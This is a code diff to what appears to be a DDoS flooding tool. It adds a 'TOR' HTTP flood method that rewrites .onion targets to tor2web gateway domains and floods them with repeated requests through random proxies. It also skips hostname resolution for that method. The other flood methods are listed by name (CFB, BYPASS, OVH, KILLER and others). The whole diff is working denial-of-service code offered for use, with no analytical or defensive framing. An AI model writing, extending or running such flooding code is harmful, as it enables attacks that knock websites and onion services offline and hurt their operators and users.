@@ -48,6 +48,7 @@ ctx.verify_mode = CERT_NONE
 __version__: str = "2.4 SNAPSHOT"
 __dir__: Path = Path(__file__).parent
 __ip__: Any = None
+tor2webs = ['onion.ly', 'tor2web.to', 'onion.org', 'onion.pet', 'onion.ws', 'onion.top', 'onion.dog']
 
 
 with open(__dir__ / "config.json") as f:
@@ -96,7 +97,7 @@ class Methods:
     LAYER7_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
-        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER"
+        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR"
     }
 
 
@@ -664,7 +665,7 @@ class HttpFlood(Thread):
                            (other if other else "") +
                            "\r\n"))
 
-    def open_connection(self) -> socket:
+    def open_connection(self, host=None) -> socket:
         if self._proxies:
             sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
         else:
@@ -672,11 +673,11 @@ class HttpFlood(Thread):
 
         sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
         sock.settimeout(.9)
-        sock.connect(self._raw_target)
+        sock.connect(host or self._raw_target)
 
         if self._target.scheme.lower() == "https":
             sock = ctx.wrap_socket(sock,
-                                   server_hostname=self._target.host,
+                                   server_hostname=host[0] if host else self._target.host,
                                    server_side=False,
                                    do_handshake_on_connect=True,
                                    suppress_ragged_eofs=True)
@@ -690,7 +691,7 @@ class HttpFlood(Thread):
 
     @staticmethod
     def getMethodType(method: str) -> str:
-        return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "COOKIE", "OVH", "EVEN",
+        return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "TOR", "COOKIE", "OVH", "EVEN",
                                             "DYN", "SLOW", "PPS", "APACHE",
                                             "BOT", } \
             else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS"} \
@@ -705,6 +706,20 @@ class HttpFlood(Thread):
              '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
         s = None
         with  suppress(Exception), self.open_connection() as s:
+            for _ in range(self._rpc):
+                Tools.send(s, payload)
+        Tools.safe_close(s)
+
+    def TOR(self) -> None:
+        provider = "." + randchoice(tor2webs)
+        target = self._target.authority.replace(".onion", provider)
+        payload: Any = str.encode(self._payload +
+                                          f"Host: {target}\r\n" +
+                                          self.randHeadercontent +
+                                          "\r\n")
+        s = None
+        target = self._target.host.replace(".onion", provider), self._raw_target[1]
+        with suppress(Exception), self.open_connection(target) as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
         Tools.safe_close(s)
@@ -1050,6 +1065,8 @@ class HttpFlood(Thread):
             self.SENT_FLOOD = self.NULL
         if name == "COOKIE":
             self.SENT_FLOOD = self.COOKIES
+        if name == "TOR":
+            self.SENT_FLOOD = self.TOR
         if name == "PPS":
             self.SENT_FLOOD = self.PPS
             self._defaultpayload = (
@@ -1429,10 +1446,13 @@ if __name__ == '__main__':
               if method in Methods.LAYER7_METHODS:
                   url = URL(urlraw)
                   host = url.host
-                  try:
-                      host = gethostbyname(url.host)
-                  except Exception as e:
-                      exit('Cannot resolve hostname ', url.host, e)
+
+                  if method != "TOR":
+                      try:
+                          host = gethostbyname(url.host)
+                      except Exception as e:
+                          exit('Cannot resolve hostname ', url.host, str(e))
+                  
                   threads = int(argv[4])
                   rpc = int(argv[6])
                   timer = int(argv[7])
